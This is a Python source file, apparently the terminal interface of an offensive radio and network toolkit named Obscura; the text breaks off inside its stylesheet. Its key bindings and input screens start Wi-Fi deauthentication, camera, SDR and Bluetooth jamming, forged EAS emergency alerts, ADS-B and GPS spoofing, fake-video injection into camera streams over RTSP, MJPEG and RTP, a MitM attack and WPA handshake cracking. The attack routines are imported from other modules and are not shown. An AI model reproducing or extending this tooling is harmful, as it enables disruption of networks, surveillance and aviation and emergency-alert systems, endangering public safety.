# Global Attack State Flags
network_deauth_active = False
camera_jamming_active = False
sdr_jamming_active = False
hybrid_jamming_active = False

from textual.app import App, ComposeResult
from textual.widgets import (
    Header,
    Footer,
    DataTable,
    Label,
    ProgressBar,
    TabbedContent,
    TabPane,
    Input,
    Button,
    Select,
    ContentSwitcher,
    Static,
    RichLog,
    Switch,
)
from textual.screen import ModalScreen
from textual.binding import Binding
from textual.containers import Container, VerticalScroll
from textual.reactive import reactive
from textual.events import Key, Mount, MouseDown
from textual.css.query import NoMatches
from textual import on
import threading
import time
from datetime import datetime
import os
import re
import base64
from PIL import Image
from io import BytesIO
import requests
import code
import asyncio
import subprocess
import folium
import random
import string
import scapy.all as scapy
from .utils import (
    log_message,
    load_config,
    save_config,
    find_stream_url,
    detected_cameras_lock,
    detected_networks_lock,
)
from typing import Any
from obscura.threads import (
    camera_jamming_thread,
    bluetooth_jam,
    network_deauth_thread,
    sdr_jamming_thread,
    hybrid_jamming_thread,
)
from obscura.injection import (
    start_mdns_listener,
    start_ssdp_listener,
    crack_handshake,
    send_probe_request,
)


# Custom Widget for Matrix Rain Background
class MatrixRain(Static):
    """A background widget displaying falling Matrix-style characters with enhanced smoothness."""

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.columns = 60
        self.chars = [
            random.choice(string.ascii_letters + string.digits + " ")
            for _ in range(self.columns * 15)
        ]
        self.positions = [random.randint(0, 25) for _ in range(self.columns)]
        self.speeds = [random.uniform(0.5, 1.5) for _ in range(self.columns)]

    def on_mount(self) -> None:
        self.set_interval(1 / 60, self.update_rain)  # 60 FPS for smooth animation

    def update_rain(self) -> None:
        for i in range(self.columns):
            if random.random() < 0.7:
                self.positions[i] = (self.positions[i] + self.speeds[i]) % 25
        self.update(self.render_rain())

    def render_rain(self) -> str:
        lines = [""] * 25
        for col in range(self.columns):
            pos = int(self.positions[col])
            char = self.chars[col]
            fade = random.choice(["#00FF00", "#00CC00", "#009900"])
            if 0 <= pos < len(lines):
                lines[pos] += f"[{fade}]{char}[/]"
        return "\n".join(lines)


# Stream Widget with Retry and Buffer Reuse
class StreamWidget(Static):
    """A widget to display live MJPEG streams with reactive updates, error handling, and retry logic."""

    frame = reactive(None)

    def __init__(self, url=None, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.url = url
        self.streaming = False
        self.thread = None
        self.last_error = None
        self.buffer = BytesIO()  # Reusable buffer

    def start_stream(self):
        if not self.url or self.streaming:
            return
        self.streaming = True
        self.thread = threading.Thread(target=self._stream_frames, daemon=True)
        self.thread.start()

    def stop_stream(self):
        self.streaming = False
        if self.thread:
            self.thread.join(timeout=2)
        self.frame = None
        self.update("[yellow]Stream stopped[/]")

    def _stream_frames(self):
        for attempt in range(3):  # Retry with backoff
            try:
                response = requests.get(self.url, stream=True, timeout=5)
                if response.status_code == 200:
                    boundary = None
                    buffer = b""
                    for chunk in response.iter_content(chunk_size=2048):
                        if not self.streaming:
                            break
                        buffer += chunk
                        if not boundary:
                            content_type = response.headers.get("Content-Type", "")
                            if "multipart/x-mixed-replace" in content_type:
                                boundary = content_type.split("boundary=")[1].encode()
                            else:
                                self.app.notify("[red]Invalid MJPEG stream[/]")
                                break
                        while b"\r\n" in buffer and self.streaming:
                            parts = buffer.split(b"\r\n", 1)
                            if len(parts) < 2:
                                break
                            header = parts[0]
                            buffer = parts[1]
                            if header == b"--" + boundary:
                                buffer = buffer.split(b"\r\n\r\n", 1)[1]
                                frame_end = buffer.find(b"--" + boundary)
                                if frame_end != -1:
                                    frame_data = buffer[:frame_end]
                                    buffer = buffer[frame_end:]
                                    try:
                                        img = Image.open(BytesIO(frame_data))
                                        img = img.resize(
                                            (400, 300), Image.Resampling.LANCZOS
                                        )
                                        self.buffer.seek(0)
                                        img.save(self.buffer, format="PNG")
                                        img_str = base64.b64encode(
                                            self.buffer.getvalue()
                                        ).decode()
                                        self.frame = f"[img]data:image/png;base64,{img_str}[/img]"
                                        self.update(self.frame)
                                    except Exception as e:
                                        self.last_error = str(e)
                                        self.app.notify(f"[red]Frame error: {e}[/]")
                    break
            except requests.RequestException as e:
                self.last_error = str(e)
                self.app.notify(f"[red]Stream error (attempt {attempt+1}/3): {e}[/]")
                time.sleep(2 * (attempt + 1))  # Exponential backoff
        else:
            self.app.notify("[red]Stream failed after 3 attempts[/]")
        self.streaming = False
        self.frame = None
        self.update("[yellow]Stream stopped[/]")


# Confirmation Dialog for Destructive Actions
class ConfirmDialog(ModalScreen[bool]):
    def __init__(self, message: str, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.message = message

    def compose(self) -> ComposeResult:
        yield Label(self.message, id="confirm_message")
        yield Button("Yes", id="yes", tooltip="Confirm the action")
        yield Button("No", id="no", tooltip="Cancel the action")

    def on_button_pressed(self, event: Button.Pressed) -> None:
        self.dismiss(event.button.id == "yes")


# Glitch Alert Popup
class GlitchAlert(ModalScreen[None]):
    def __init__(self, message: str, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.message = message

    def compose(self) -> ComposeResult:
        yield Static(self.render_alert(), id="alert_text")

    def on_mount(self) -> None:
        self.set_timer(3.0, self.dismiss)
        self.run_worker(self.animate_glitch())

    def render_alert(self) -> str:
        return f"[red]╔════╗\n║ [/][bold red blink]ALERT[/] [red]║\n║[/] {self.message} [red]║\n╚════╝[/]"

    async def animate_glitch(self) -> None:
        alert = self.query_one("#alert_text", Static)
        for _ in range(5):
            alert.styles.offset = (random.randint(-2, 2), random.randint(-1, 1))
            alert.styles.opacity = random.uniform(0.7, 1.0)
            await asyncio.sleep(0.08)  # Changed from self.sleep to asyncio.sleep
        alert.styles.offset = (0, 0)
        alert.styles.opacity = 1.0


# Command Line Interface
class CommandLine(ModalScreen[None]):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.cmd_history = []
        self.cmd_index = -1
        self.commands = [
            "help", "status", "hack the gibson", "theme", "scan", "load_plugin"
        ]

    def compose(self) -> ComposeResult:
        yield Label(">_ ", id="prompt")
        yield Input(
            id="cmd_input",
            placeholder="Type command (e.g., help, status, load_plugin foo)",
            tooltip="Enter a command"
        )
        yield RichLog(id="cmd_output")

    def on_mount(self) -> None:
        self.history_path = os.path.expanduser("~/.obscura_cmd_history.txt")
        if os.path.exists(self.history_path):
            with open(self.history_path, "r") as f:
                self.cmd_history = [line.strip() for line in f if line.strip()]
            self.cmd_index = len(self.cmd_history)

    def on_input_submitted(self, event: Input.Submitted) -> None:
        cmd = event.value.strip()
        if not cmd:
            return

        self.cmd_history.append(cmd)
        self.cmd_index = len(self.cmd_history) - 1
        with open(self.history_path, "a") as f:
            f.write(cmd + "\n")

        output = self.query_one("#cmd_output", RichLog)
        cmd_lower = cmd.lower()

        if cmd_lower == "help":
            output.write("[green]Available Commands: " + ", ".join(self.commands) + "[/]")
        elif cmd_lower == "status":
            uptime = int(time.time() - self.app.start_time)
            output.write(f"[green]Uptime: {uptime}s | Networks: {len(self.app.detected_networks)} | Cameras: {len(self.app.detected_cameras)}[/]")
        elif cmd_lower == "hack the gibson":
            output.write("[red blink]Access Denied: Chaos level critical[/]")
        elif cmd_lower == "theme":
            output.write(f"[green]Current theme: {self.app.obscura_theme}[/]")
        elif cmd_lower == "scan":
            output.write("[green]Initiating scan...[/]")
            self.app.action_scan_vulnerabilities()
        elif cmd_lower.startswith("load_plugin"):
            parts = cmd.split(maxsplit=1)
            if len(parts) == 2:
                plugin_name = parts[1]
                try:
                    self.app.orchestrator.load_plugin(plugin_name)
                    output.write(f"[green]✓ Loaded plugin: {plugin_name}[/]")
                except ImportError as e:
                    output.write(f"[red]Plugin load failed: {e}[/]")
                except Exception as e:
                    output.write(f"[red]Unexpected error: {e}[/]")
            else:
                output.write("[yellow]Usage: load_plugin plugin_name[/]")
        else:
            output.write("[red]Unknown command. Type 'help' for options.[/]")

        self.query_one("#cmd_input", Input).value = ""

    def on_key(self, event: Key) -> None:
        input_widget = self.query_one("#cmd_input", Input)
        if event.key == "up" and self.cmd_history:
            self.cmd_index = max(0, self.cmd_index - 1)
            input_widget.value = self.cmd_history[self.cmd_index]
        elif event.key == "down" and self.cmd_history:
            self.cmd_index = min(len(self.cmd_history) - 1, self.cmd_index + 1)
            input_widget.value = (
                self.cmd_history[self.cmd_index]
                if self.cmd_index < len(self.cmd_history)
                else ""
            )
        elif event.key == "tab":
            current = input_widget.value.lower()
            matches = [c for c in self.commands if c.startswith(current)]
            if matches:
                input_widget.value = matches[0]



# Modal Screens for Input
class HIDInputScreen(ModalScreen[None]):
    def compose(self) -> ComposeResult:
        yield Label(
            "Enter target MAC for HID spoofing:",
            tooltip="MAC address format: 00:11:22:33:44:55",
        )
        yield Label(id="mac_error", classes="error-label")
        yield Input(
            id="mac_input",
            placeholder="e.g., 00:11:22:33:44:55",
            tooltip="Enter the target's MAC address",
        )
        yield Button("Submit", id="submit", tooltip="Start HID spoofing")
        yield Button("Cancel", id="cancel", tooltip="Cancel the operation")

    def on_button_pressed(self, event: Button.Pressed) -> None:
        if event.button.id == "submit":
            mac = self.query_one("#mac_input", Input).value
            mac_error = self.query_one("#mac_error", Label)
            mac_pattern = r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$"
            if not re.match(mac_pattern, mac):
                mac_error.update("[red]Invalid MAC address[/]")
                return
            self.dismiss(mac)
        else:
            self.dismiss(None)


class VoiceInputScreen(ModalScreen[None]):
    def compose(self) -> ComposeResult:
        yield Label("Enter Audio File Path:", tooltip="Path to an audio file")
        yield Label(id="audio_error", classes="error-label")
        yield Input(
            id="audio_file",
            placeholder="e.g., /path/to/audio.wav",
            tooltip="Enter audio file path",
        )
        yield Label("Enter Frequency (MHz):", tooltip="Frequency in MHz (0-1000)")
        yield Label(id="freq_error", classes="error-label")
        yield Input(id="frequency", placeholder="e.g., 98.1", tooltip="Enter frequency")
        yield Button("Submit", id="submit", tooltip="Start voice injection")
        yield Button("Cancel", id="cancel", tooltip="Cancel the operation")

    def on_button_pressed(self, event: Button.Pressed) -> None:
        if event.button.id == "submit":
            audio_file = self.query_one("#audio_file", Input).value
            frequency = self.query_one("#frequency", Input).value
            audio_error = self.query_one("#audio_error", Label)
            freq_error = self.query_one("#freq_error", Label)

            if not os.path.isfile(audio_file):
                audio_error.update("[red]Invalid audio file path[/]")
                return
            try:
                freq = float(frequency)
                if not 0 < freq < 1000:
                    freq_error.update("[red]Frequency out of range (0-1000 MHz)[/]")
                    return
            except ValueError:
                freq_error.update("[red]Invalid frequency[/]")
                return

            self.dismiss((audio_file, frequency))
        else:
            self.dismiss(None)


class EASInputScreen(ModalScreen[None]):
    def compose(self) -> ComposeResult:
        yield Label("Enter EAS Message:", tooltip="Message for EAS alert")
        yield Label(id="msg_error", classes="error-label")
        yield Input(
            id="message",
            placeholder="e.g., Emergency Alert",
            tooltip="Enter alert message",
        )
        yield Label(
            "Enter Language (e.g., 'en'):", tooltip="Language code (default: en)"
        )
        yield Input(
            id="language", placeholder="e.g., en", tooltip="Enter language code"
        )
        yield Button("Submit", id="submit", tooltip="Generate EAS alert")
        yield Button("Cancel", id="cancel", tooltip="Cancel the operation")

    def on_button_pressed(self, event: Button.Pressed) -> None:
        if event.button.id == "submit":
            message = self.query_one("#message", Input).value
            language = self.query_one("#language", Input).value
            msg_error = self.query_one("#msg_error", Label)

            if not message:
                msg_error.update("[red]Message cannot be empty[/]")
                return

            self.dismiss((message, language or "en"))
        else:
            self.dismiss(None)


class ADSBInputScreen(ModalScreen[None]):
    def compose(self) -> ComposeResult:
        yield Label("Enter callsign:", tooltip="Flight callsign")
        yield Label(id="callsign_error", classes="error-label")
        yield Input(
            id="callsign_input", placeholder="e.g., FLIGHT123", tooltip="Enter callsign"
        )
        yield Label("Enter latitude:", tooltip="Latitude (-90 to 90)")
        yield Label(id="lat_error", classes="error-label")
        yield Input(
            id="lat_input", placeholder="e.g., 40.7128", tooltip="Enter latitude"
        )
        yield Label("Enter longitude:", tooltip="Longitude (-180 to 180)")
        yield Label(id="lon_error", classes="error-label")
        yield Input(
            id="lon_input", placeholder="e.g., -74.0060", tooltip="Enter longitude"
        )
        yield Label("Enter ADS-B alert message:", tooltip="Alert message")
        yield Label(id="msg_error", classes="error-label")
        yield Input(
            id="message_input",
            placeholder="e.g., Emergency Alert",
            tooltip="Enter message",
        )
        yield Button("Submit", id="submit", tooltip="Start ADS-B spoofing")
        yield Button("Cancel", id="cancel", tooltip="Cancel the operation")

    def on_button_pressed(self, event: Button.Pressed) -> None:
        if event.button.id == "submit":
            callsign = self.query_one("#callsign_input", Input).value
            lat = self.query_one("#lat_input", Input).value
            lon = self.query_one("#lon_input", Input).value
            message = self.query_one("#message_input", Input).value

            callsign_error = self.query_one("#callsign_error", Label)
            lat_error = self.query_one("#lat_error", Label)
            lon_error = self.query_one("#lon_error", Label)
            msg_error = self.query_one("#msg_error", Label)

            try:
                lat = float(lat)
                lon = float(lon)
                if not (-90 <= lat <= 90):
                    lat_error.update("[red]Latitude must be -90 to 90[/]")
                    return
                if not (-180 <= lon <= 180):
                    lon_error.update("[red]Longitude must be -180 to 180[/]")
                    return
            except ValueError:
                lat_error.update("[red]Invalid latitude[/]")
                lon_error.update("[red]Invalid longitude[/]")
                return

            if not callsign or not message:
                callsign_error.update(
                    "[red]Callsign required[/]" if not callsign else ""
                )
                msg_error.update("[red]Message required[/]" if not message else "")
                return

            self.dismiss((callsign, lat, lon, message))
        else:
            self.dismiss(None)


class GPSInputScreen(ModalScreen[None]):
    def compose(self) -> ComposeResult:
        config = load_config()
        presets = [(p["name"], p["name"]) for p in config.get("presets", [])]
        yield Label("Load Preset (optional):", tooltip="Select a saved preset")
        yield Select(
            options=presets,
            id="preset_select",
            allow_blank=True,
            tooltip="Choose a preset",
        )
        yield Label("Enter latitude:", tooltip="Latitude (-90 to 90)")
        yield Label(id="lat_error", classes="error-label")
        yield Input(
            id="lat_input", placeholder="e.g., 40.7128", tooltip="Enter latitude"
        )
        yield Label("Enter longitude:", tooltip="Longitude (-180 to 180)")
        yield Label(id="lon_error", classes="error-label")
        yield Input(
            id="lon_input", placeholder="e.g., -74.0060", tooltip="Enter longitude"
        )
        yield Label("Enter altitude (meters):", tooltip="Altitude (non-negative)")
        yield Label(id="alt_error", classes="error-label")
        yield Input(id="alt_input", placeholder="e.g., 10", tooltip="Enter altitude")
        yield Button("Save as Preset", id="save_preset", tooltip="Save as new preset")
        yield Button("Submit", id="submit", tooltip="Start GPS spoofing")
        yield Button("Cancel", id="cancel", tooltip="Cancel the operation")

    def on_mount(self) -> None:
        preset = self.query_one("#preset_select", Select).value
        if preset:
            config = load_config()
            for p in config.get("presets", []):
                if p["name"] == preset:
                    self.query_one("#lat_input", Input).value = str(p["latitude"])
                    self.query_one("#lon_input", Input).value = str(p["longitude"])
                    self.query_one("#alt_input", Input).value = str(p["altitude"])
                    break

    def on_button_pressed(self, event: Button.Pressed) -> None:
        lat = self.query_one("#lat_input", Input).value
        lon = self.query_one("#lon_input", Input).value
        alt = self.query_one("#alt_input", Input).value
        lat_error = self.query_one("#lat_error", Label)
        lon_error = self.query_one("#lon_error", Label)
        alt_error = self.query_one("#alt_error", Label)

        if event.button.id in ("submit", "save_preset"):
            try:
                lat = float(lat)
                lon = float(lon)
                alt = float(alt)
                if not (-90 <= lat <= 90):
                    lat_error.update("[red]Latitude must be -90 to 90[/]")
                    return
                if not (-180 <= lon <= 180):
                    lon_error.update("[red]Longitude must be -180 to 180[/]")
                    return
                if alt < 0:
                    alt_error.update("[red]Altitude must be non-negative[/]")
                    return
            except ValueError:
                lat_error.update("[red]Invalid latitude[/]")
                lon_error.update("[red]Invalid longitude[/]")
                alt_error.update("[red]Invalid altitude[/]")
                return

            if event.button.id == "submit":
                self.dismiss(("submit", (lat, lon, alt)))
            else:
                self.push_screen(
                    PresetsScreen(), lambda res: self.save_preset(res, lat, lon, alt)
                )
        else:
            self.dismiss(None)

    def save_preset(self, result, lat, lon, alt):
        if result and result[0] == "save":
            preset_name = result[1]
            config = load_config()
            presets = config.get("presets", [])
            presets.append(
                {
                    "name": preset_name,
                    "latitude": lat,
                    "longitude": lon,
                    "altitude": alt,
                }
            )
            config["presets"] = presets
            save_config(config)
            self.app.notify(f"[green]Preset '{preset_name}' saved[/]")


class RTSPInputScreen(ModalScreen[None]):
    def compose(self) -> ComposeResult:
        yield Label("Enter Camera IP:", tooltip="IP of the camera")
        yield Label(id="camera_ip_error", classes="error-label")
        yield Input(
            id="camera_ip_input",
            placeholder="e.g., 192.168.1.100",
            tooltip="Enter camera IP",
        )
        yield Label("Enter Viewer IP:", tooltip="IP of the viewer")
        yield Label(id="victim_ip_error", classes="error-label")
        yield Input(
            id="victim_ip_input",
            placeholder="e.g., 192.168.1.101",
            tooltip="Enter viewer IP",
        )
        yield Label("Enter Path to Fake Video:", tooltip="Path to video file")
        yield Label(id="video_error", classes="error-label")
        yield Input(
            id="video_input",
            placeholder="e.g., /path/to/video.mp4",
            tooltip="Enter video path",
        )
        yield Button("Submit", id="submit", tooltip="Start RTSP injection")
        yield Button("Cancel", id="cancel", tooltip="Cancel the operation")

    def on_button_pressed(self, event: Button.Pressed) -> None:
        if event.button.id == "submit":
            camera_ip = self.query_one("#camera_ip_input", Input).value
            victim_ip = self.query_one("#victim_ip_input", Input).value
            video = self.query_one("#video_input", Input).value

            camera_ip_error = self.query_one("#camera_ip_error", Label)
            victim_ip_error = self.query_one("#victim_ip_error", Label)
            video_error = self.query_one("#video_error", Label)

            ip_pattern = r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$"
            if not re.match(ip_pattern, camera_ip):
                camera_ip_error.update("[red]Invalid IP[/]")
                return
            if not re.match(ip_pattern, victim_ip):
                victim_ip_error.update("[red]Invalid IP[/]")
                return
            if not os.path.isfile(video):
                video_error.update("[red]Invalid video path[/]")
                return

            self.dismiss((camera_ip, victim_ip, video))
        else:
            self.dismiss(None)


class MJPEGInputScreen(ModalScreen[None]):
    def compose(self) -> ComposeResult:
        yield Label(
            "Enter Path to Video or Image:", tooltip="Path to video or image file"
        )
        yield Label(id="source_error", classes="error-label")
        yield Input(
            id="source_input",
            placeholder="e.g., /path/to/video.mp4",
            tooltip="Enter file path",
        )
        yield Button("Submit", id="submit", tooltip="Start MJPEG injection")
        yield Button("Cancel", id="cancel", tooltip="Cancel the operation")

    def on_button_pressed(self, event: Button.Pressed) -> None:
        if event.button.id == "submit":
            source = self.query_one("#source_input", Input).value
            source_error = self.query_one("#source_error", Label)

            if not os.path.isfile(source):
                source_error.update("[red]Invalid file path[/]")
                return

            valid_extensions = (".mp4", ".avi", ".jpg", ".jpeg", ".png")
            if not source.lower().endswith(valid_extensions):
                source_error.update("[red]Use .mp4, .avi, .jpg, .jpeg, or .png[/]")
                return

            self.dismiss(source)
        else:
            self.dismiss(None)


class RTPInputScreen(ModalScreen[None]):
    def compose(self) -> ComposeResult:
        yield Label("Enter Camera IP:", tooltip="IP of the camera")
        yield Label(id="camera_ip_error", classes="error-label")
        yield Input(
            id="camera_ip_input",
            placeholder="e.g., 192.168.1.100",
            tooltip="Enter camera IP",
        )
        yield Label("Enter Path to H.264 Video:", tooltip="Path to H.264 video file")
        yield Label(id="video_error", classes="error-label")
        yield Input(
            id="video_input",
            placeholder="e.g., /path/to/video.h264",
            tooltip="Enter video path",
        )
        yield Button("Submit", id="submit", tooltip="Start RTP injection")
        yield Button("Cancel", id="cancel", tooltip="Cancel the operation")

    def on_button_pressed(self, event: Button.Pressed) -> None:
        if event.button.id == "submit":
            camera_ip = self.query_one("#camera_ip_input", Input).value
            video = self.query_one("#video_input", Input).value

            camera_ip_error = self.query_one("#camera_ip_error", Label)
            video_error = self.query_one("#video_error", Label)

            ip_pattern = r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$"
            if not re.match(ip_pattern, camera_ip):
                camera_ip_error.update("[red]Invalid IP[/]")
                return

            if not os.path.isfile(video) or not video.lower().endswith(".h264"):
                video_error.update("[red]Invalid .h264 file[/]")
                return

            self.dismiss((camera_ip, video))
        else:
            self.dismiss(None)


class MitMInputScreen(ModalScreen[None]):
    def compose(self) -> ComposeResult:
        yield Label("Enter Viewer IP:", tooltip="IP of the viewer")
        yield Label(id="victim_ip_error", classes="error-label")
        yield Input(
            id="victim_ip_input",
            placeholder="e.g., 192.168.1.101",
            tooltip="Enter viewer IP",
        )
        yield Label("Enter Camera IP:", tooltip="IP of the camera")
        yield Label(id="camera_ip_error", classes="error-label")
        yield Input(
            id="camera_ip_input",
            placeholder="e.g., 192.168.1.100",
            tooltip="Enter camera IP",
        )
        yield Button("Submit", id="submit", tooltip="Start MitM attack")
        yield Button("Cancel", id="cancel", tooltip="Cancel the operation")

    def on_button_pressed(self, event: Button.Pressed) -> None:
        if event.button.id == "submit":
            victim_ip = self.query_one("#victim_ip_input", Input).value
            camera_ip = self.query_one("#camera_ip_input", Input).value

            victim_ip_error = self.query_one("#victim_ip_error", Label)
            camera_ip_error = self.query_one("#camera_ip_error", Label)

            ip_pattern = r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$"
            if not re.match(ip_pattern, victim_ip):
                victim_ip_error.update("[red]Invalid IP[/]")
                return

            if not re.match(ip_pattern, camera_ip):
                camera_ip_error.update("[red]Invalid IP[/]")
                return

            self.dismiss((victim_ip, camera_ip))
        else:
            self.dismiss(None)


class ThemeScreen(ModalScreen[None]):
    def compose(self) -> ComposeResult:
        yield Label("Select or Create Theme", tooltip="Choose or customize a theme")
        yield Select(
            options=[
                ("Dark", "dark"),
                ("Light", "light"),
                ("High Contrast", "high_contrast"),
                ("Solarized Dark", "solarized_dark"),
                ("Solarized Light", "solarized_light"),
                ("Custom", "custom"),
            ],
            id="theme_select",
            value=self.app.obscura_theme,
            tooltip="Select a theme",
        )
        yield Input(
            id="theme_name",
            placeholder="Custom theme name",
            tooltip="Name for custom theme",
        )
        yield Input(
            id="bg_color",
            placeholder="Background (e.g., #121212)",
            tooltip="Background color hex",
        )
        yield Input(
            id="fg_color",
            placeholder="Foreground (e.g., #FFFFFF)",
            tooltip="Foreground color hex",
        )
        yield Button("Apply", id="apply", tooltip="Apply selected theme")
        yield Button("Preview", id="preview", tooltip="Preview custom theme")
        yield Button("Save Custom", id="save", tooltip="Save custom theme")
        yield Button("Cancel", id="cancel", tooltip="Cancel the operation")

    def on_button_pressed(self, event: Button.Pressed) -> None:
        theme = self.query_one("#theme_select", Select).value
        theme_name = self.query_one("#theme_name", Input).value
        bg_color = self.query_one("#bg_color", Input).value
        fg_color = self.query_one("#fg_color", Input).value
        color_pattern = r"^#[0-9A-Fa-f]{6}$"

        if event.button.id == "apply":
            self.dismiss(("apply", theme))
        elif (
            event.button.id == "preview" and theme == "custom" and bg_color and fg_color
        ):
            if not (
                re.match(color_pattern, bg_color) and re.match(color_pattern, fg_color)
            ):
                self.app.notify("[red]Use hex codes (e.g., #121212)[/]")
                return
            self.dismiss(
                (
                    "preview",
                    {"name": theme_name or "custom", "bg": bg_color, "fg": fg_color},
                )
            )
        elif event.button.id == "save" and theme_name and bg_color and fg_color:
            if not (
                re.match(color_pattern, bg_color) and re.match(color_pattern, fg_color)
            ):
                self.app.notify("[red]Use hex codes (e.g., #121212)[/]")
                return
            self.dismiss(("save", {"name": theme_name, "bg": bg_color, "fg": fg_color}))
        else:
            self.dismiss(None)


class PresetsScreen(ModalScreen[None]):
    def compose(self) -> ComposeResult:
        yield Label("Manage Presets", tooltip="Manage GPS presets")
        yield Select(
            options=[(p["name"], p["name"]) for p in load_config().get("presets", [])],
            id="preset_select",
            allow_blank=True,
            tooltip="Select a preset",
        )
        yield Input(
            id="preset_name",
            placeholder="New preset name",
            tooltip="Enter new preset name",
        )
        yield Button("Save Preset", id="save", tooltip="Save new preset")
        yield Button("Load Preset", id="load", tooltip="Load selected preset")
        yield Button("Delete Preset", id="delete", tooltip="Delete selected preset")
        yield Button("Cancel", id="cancel", tooltip="Cancel the operation")

    def on_button_pressed(self, event: Button.Pressed) -> None:
        preset_name = self.query_one("#preset_name", Input).value
        selected_preset = self.query_one("#preset_select", Select).value

        if event.button.id == "save" and preset_name:
            self.dismiss(("save", preset_name))
        elif event.button.id == "load" and selected_preset:
            self.dismiss(("load", selected_preset))
        elif event.button.id == "delete" and selected_preset:
            self.dismiss(("delete", selected_preset))
        else:
            self.dismiss(None)


class CameraContextMenu(ModalScreen[None]):
    def __init__(self, camera_mac: str):
        super().__init__()
        self.camera_mac = camera_mac

    def compose(self) -> ComposeResult:
        yield Label(f"Options for Camera: {self.camera_mac}")
        yield Button("Inject RTP", id="rtp", tooltip="Inject RTP stream")
        yield Button("Inject MJPEG", id="mjpeg", tooltip="Inject MJPEG stream")
        yield Button("Inject RTSP", id="rtsp", tooltip="Inject RTSP stream")
        yield Button("Cancel", id="cancel", tooltip="Cancel the operation")

    def on_button_pressed(self, event: Button.Pressed) -> None:
        self.dismiss(event.button.id)


class HelpScreen(ModalScreen[None]):
    def compose(self) -> ComposeResult:
        yield Label(
            "Key Bindings Cheat Sheet", classes="title", tooltip="List of key bindings"
        )
        yield RichLog(id="help_log")

    def on_mount(self) -> None:
        help_log = self.query_one("#help_log", RichLog)
        help_log.write("[bold green]ObscuraApp Controls[/]\n")
        for binding in self.app.BINDINGS:
            if binding.show:
                help_log.write(
                    f"[yellow]{binding.key.upper()}[/] - {binding.description}"
                )


# Main Application Class
class ObscuraApp(App):
    """Main application class for Obscura, a hacker-style terminal UI with enhanced features."""

    BINDINGS = [
        Binding("1", "switch_tab('dashboard')", "Dashboard", show=True),
        Binding("2", "switch_tab('monitoring')", "Monitoring", show=True),
        Binding("3", "switch_tab('actions')", "Actions", show=True),
        Binding("4", "switch_tab('metrics')", "Metrics", show=True),
        Binding("5", "switch_tab('visualization')", "Visualization", show=True),
        Binding("6", "switch_tab('map')", "Map", show=True),
        Binding("7", "switch_tab('replay')", "Packet Replay", show=True),
        Binding("j", "toggle_camera_jamming", "Toggle Camera Jamming", show=True),
        Binding("b", "start_bluetooth_jamming", "Bluetooth Jamming", show=True),
        Binding("d", "toggle_deauth", "Deauth All", show=True),
        Binding("s", "toggle_sdr_jamming", "SDR Jamming", show=True),
        Binding("h", "toggle_hybrid_jamming", "Hybrid Jamming", show=True),
        Binding("i", "bluetooth_hid_spoof", "HID Spoofing", show=True),
        Binding("v", "voice_injection", "Voice Injection", show=True),
        Binding("e", "eas_alert_injection", "EAS Alert", show=True),
        Binding("a", "adsb_spoofing", "ADS-B Spoofing", show=True),
        Binding("g", "gps_spoofing", "GPS Spoofing", show=True),
        Binding("r", "rtsp_injection", "RTSP Injection", show=True),
        Binding("m", "mjpeg_injection", "MJPEG Injection", show=True),
        Binding("t", "rtp_injection", "RTP Injection", show=True),
        Binding("n", "bettercap_mitm", "MitM Attack", show=True),
        Binding("p", "toggle_stream_preview", "Stream Preview", show=True),
        Binding("x", "launch_external_viewer", "External Viewer", show=True),
        Binding("c", "live_python_shell", "Python Shell", show=True),
        Binding("down", "scroll_down_networks", "Scroll Networks Down", show=False),
        Binding("up", "scroll_up_networks", "Scroll Networks Up", show=False),
        Binding("k", "toggle_handshake_table", "Handshake Table", show=True),
        Binding("l", "focus_logs", "Focus Logs", show=True),
        Binding("q", "quit", "Quit", show=True),
        Binding("M", "start_mdns_ssdp_listeners", "mDNS/SSDP", show=True),
        Binding("S", "discover_stream_urls", "Stream Discovery", show=True),
        Binding("P", "send_probe_request", "Probe Request", show=True),
        Binding("C", "capture_handshake", "Capture Handshake", show=True),
        Binding("K", "crack_handshake", "Crack Handshake", show=True),
        Binding("V", "scan_vulnerabilities", "Scan Vulns", show=True),
        Binding("B", "scan_bluetooth", "Scan Bluetooth", show=True),
        Binding("T", "change_theme", "Change Theme", show=True),
        Binding("D", "detect_threats", "Detect Threats", show=True),
        Binding("R", "replay_packet", "Replay Packet", show=True),
        Binding("A", "plan_attack", "Plan Attack", show=True),
        Binding("?", "show_help", "Help", show=True),
        Binding("ctrl+c", "open_command_line", "Command Line", show=True),
        Binding("ctrl+d", "toggle_debug_mode", "Toggle Debug Mode", show=True),
        Binding("ctrl+m", "toggle_matrix", "Toggle Matrix Rain", show=True),
        Binding("L", "show_plugins", "List Plugins", show=True),
        Binding("z", "launch_satellite_dashboard", "Launch Satellite UI", show=True),


    ]

    DEFAULT_CSS = """
    Screen {
        background: #121212;
        color: #00FF00;
        layout: vertical;
    }
    MatrixRain {
        position: absolute;
        width: 100%;
        height: 100%;
        layer: background;
        opacity: 0.5;
    }
    Header {
        background: #002b36;
        color: #00FF00;
        text-style: bold;
        dock: top;
    }
    Footer {
        background: #002b36;
        color: #00FF00;
        dock: bottom;
    }
    DataTable {
        height: 1fr;
        border: solid #00FF00;
        background: transparent;
        margin: 1;
    }
    DataTable > .datatable--header {
        background: #00FF00;
        color: #121212;
    }
    DataTable > .datatable--row:hover {
        background: #003300;
    }
    DataTable > .datatable--row--cursor {
        background: #006600;
    }
    RichLog {
        height: 12;
        border: solid #00FF00;
        background: transparent;
        padding: 1;
        margin: 1;
    }
    #stream_switcher {
        height: 20;
        border: solid #00FF00;
        margin: 1;
    }
    #progress_container {
        height: 10;
        layout: vertical;
        margin: 1;
    }
    ModalScreen {
        align: center middle;
        background: rgba(0, 0, 0, 0.8);
    }
    ModalScreen > * {
        width: 60%;
        margin: 1;
        background: #121212;
        border: solid #00FF00;
        padding: 1;
    }
    TabPane {
        padding: 1;
        layout: vertical;
    }
    Tabs {
        background: #121212;
        color: #00FF00;
    }
    Tabs > .tabs--active {
        background: #00FF00;
        color: #121212;
    }
    Select, Input {
        width: 25;
        margin: 1;
        border: solid #00FF00;
    }
    Button {
        background: #003300;
        color: #00FF00;
        border: solid #00FF00;
        margin: 1;
